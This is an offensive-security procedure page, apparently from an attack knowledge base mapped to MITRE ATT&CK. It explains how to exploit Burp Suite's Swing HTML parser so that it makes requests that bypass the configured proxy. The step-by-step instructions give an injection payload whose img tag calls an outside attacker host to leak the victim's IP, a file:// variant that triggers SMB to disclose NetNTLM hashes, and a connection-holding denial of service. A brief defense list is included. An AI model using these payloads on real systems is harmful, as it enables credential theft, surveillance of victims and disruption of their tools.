---
id: proc-issue-unsolicited-requests
tags:
  - ssrf
  - proxy-bypass
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/Minimal-GET-Parameter-Injection]]'
verified: false
platforms:
  - Desktop
  - Java
  - Windows
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exfiltration Over Alternative Protocol]]'
updated_at: '2025-12-14T17:26:56.382Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Exfiltration Over Alternative Protocol]]'
---
# Issue-Unsolicited-Requests-via-Swing-Parser

## Summary

This procedure exploits Burp Suite's Swing HTML parser to issue hidden network requests for external resources, bypassing configured proxies and enabling IP leaks or local protocol triggers like SMB for NetNTLM disclosure.

## Description

Once rendered, the parser fetches URLs in tags like <img src='http://attacker.com'> directly, ignoring User Options > Upstream Proxy Servers or SOCKS. For advanced impacts, use file:// schemes to negotiate SMB on port 445, leaking hashes on Windows. This creates SSRF-like exfiltration from the client's context. Outcomes: Attacker receives victim IP/headers; DoS via open connections. Prerequisites: Rendered malicious HTML in Burp.

## Requirements

1. Vulnerable Burp Suite with proxy configs
2. Windows for SMB/NetNTLM
3. Open port 445 for local SMB triggers

## Defense

Defensive measures and detection strategies:

- Patch Burp to version 2021.2+ with HTML sanitization
- Configure firewalls to block Burp outbound except proxies
- Enable NTLMv2 and SMB signing
- Log anomalous connections from Java/Swing processes

## Objectives

1. Force direct fetches to external/internal resources
2. Leak data via HTTP or SMB protocols
3. Sustain connections for DoS

## Instructions

### Step 1: Embed External URL Payload

**Context**: Use http:// for IP leak in img/link tags.

**Command** ([[commands/Minimal-GET-Parameter-Injection]]):
```bash
?=<html><img+src='http://www.rec2.ml/leak'>
```

> Render in Burp; expected: Direct HTTP GET to attacker URL, bypassing proxy.

### Step 2: Trigger Local Protocol for Hashes

**Context**: Use file:// to hit SMB, disclosing NetNTLM.

Modify payload: <img src='file://localhost/share'>

> Expected: Burp attempts SMB connect on 445, sending unauth NetNTLMv2 hash.

### Step 3: DoS via Open Connections

**Context**: Keep TCP open to freeze Burp.

Use payload with long-polling endpoint.

> Expected: Burp UI hangs on unresolved connections.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Exfiltration Over Alternative Protocol]] Exfiltration Over Alternative Protocol

### Sub-Techniques


## Commands Used

- [[commands/Minimal-GET-Parameter-Injection]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- [[ssrf]]
- [[proxy-bypass]]
